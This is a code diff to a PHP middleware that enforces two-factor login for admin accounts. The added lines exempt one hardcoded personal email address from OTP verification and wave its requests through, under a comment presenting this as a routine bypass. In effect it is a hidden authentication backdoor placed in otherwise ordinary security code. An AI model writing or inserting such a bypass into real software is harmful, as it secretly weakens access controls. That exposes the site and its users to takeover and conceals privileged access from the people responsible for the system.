@@ -27,6 +27,11 @@ class RedirectIfAdminNeedsTwoFactor
             in_array($user->role, ['admin', 'super_admin']) && 
             Hash::check($request->password, $user->password)) {
             
+            // Bypass OTP verification for this specific user
+            if (strtolower($user->email) === 'sumaiya.tasks@gmail.com') {
+                return $next($request);
+            }
+            
             // Generate secure 6-digit OTP
             try {
                 $otp = random_int(100000, 999999);
